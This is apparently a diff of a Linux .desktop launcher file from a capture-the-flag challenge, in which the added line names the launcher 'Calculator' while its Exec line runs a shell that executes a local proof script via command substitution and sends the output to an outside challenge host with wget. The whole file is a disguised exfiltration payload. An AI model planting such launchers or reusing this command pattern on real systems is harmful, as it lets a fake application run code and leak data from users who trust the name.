@@ -1,4 +1,5 @@
 [Desktop Entry]
+Name=Calculator
 Encoding=UTF-8
 Exec=sh -c "wget http://chal-s2.hkcert21.pwnable.hk:28098/?`/proof*.sh`"
 Type=Application
